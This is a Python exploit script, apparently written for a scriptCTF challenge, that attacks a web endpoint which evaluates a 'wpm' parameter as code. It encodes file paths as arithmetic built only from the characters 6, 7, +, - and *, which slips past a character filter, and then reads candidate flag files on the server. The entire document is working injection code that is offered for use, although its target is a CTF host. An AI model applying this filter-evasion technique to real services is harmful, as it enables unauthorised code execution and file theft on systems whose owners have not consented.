#!/usr/bin/env python3
import re
import html
import requests

TARGET = "https://9c7da55e-1975-44dc-b680-c6ba9d9e299b.challs.scriptsorcerers.xyz"

# byte expression hanya pakai char aman: 6,7,+,-,*
E = {
    46: "66-6-7-7",          # .
    47: "66-7-6-6",          # /
    97: "77+7+7+6",          # a
    102: "66+6*6",           # f
    103: "66+6*6+7-6",       # g
    108: "66+7*6",           # l
    112: "77+7*7-7-7",       # p
    116: "66+7*7+7-6",       # t
    120: "77+7*6+7-6",       # x
}

def bpayload(path: str) -> str:
    arr = "+".join(f"[{E[ord(c)]}]" for c in path)
    return f"open(next(open(bytes({arr}))))"

candidates = [
    "/flag.txt",
    "/app/flag.txt",
    "../flag.txt",
    "../../flag.txt",
]

for path in candidates:
    payload = bpayload(path)
    print("=" * 80)
    print("[+] path:", path)
    print("[+] payload:", payload)
    print("[+] unique chars:", len(set(payload.lower())))

    r = requests.get(TARGET + "/rate", params={"wpm": payload}, timeout=20)
    text = html.unescape(r.text)

    print("[+] status:", r.status_code)
    print("[+] body length:", len(text))

    m = re.search(r"scriptCTF\{[^}]+\}", text)
    if m:
        print("[+] FLAG:", m.group(0))
        break

    # bantu debug kalau belum dapat
    err = re.search(r"(FileNotFoundError|ValueError|TypeError|NameError)[\s\S]{0,250}", text)
    if err:
        print(err.group(0))
